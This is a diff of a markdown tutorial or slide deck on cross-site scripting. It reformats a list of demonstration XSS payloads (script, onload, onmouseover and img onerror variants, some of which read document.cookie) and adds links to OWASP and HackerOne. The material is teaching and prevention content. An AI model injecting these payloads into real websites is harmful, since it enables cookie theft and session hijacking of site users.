@@ -62,10 +62,13 @@ Blog posts, comments on blogs, forum posts are all examples of where malicious c
 <img src="./emailalert.png" height=500>
 `http://www.example.com/index.php?name=guest<script>alert('Your data belong to us')</script>`
 +++
-* `<script>alert(document.cookie)</script>`
-* `<body onload=alert('Pwned')>`
-* `<b onmouseover=alert('Gotcha!')>click me!</b>`
-* `<img src="http://url.to.file.which/not.exist" onerror=alert(document.cookie);>`
+`<script>alert(document.cookie)</script>`
+<br/>
+`<body onload=alert('Pwned')>`
+<br/>
+`<b onmouseover=alert('Gotcha!')>click me!</b>`
+<br/>
+`<img src="http://url.to.file.which/not.exist" onerror=alert(document.cookie);>`
 ---
 ### Interactive Hacking Session!
 Go to https://xss-game.appspot.com/ 
@@ -73,3 +76,5 @@ Go to https://xss-game.appspot.com/
 ### How to Prevent Hacking
 OWASP has a ton of great information on how to prevent not only XSS but also many other vulnerabilites.
 https://www.owasp.org/index.php/Category:How_To
+<br/>
+https://hackerone.com/directory?query=ibb%3Ayes&sort=published_at%3Adescending&page=1
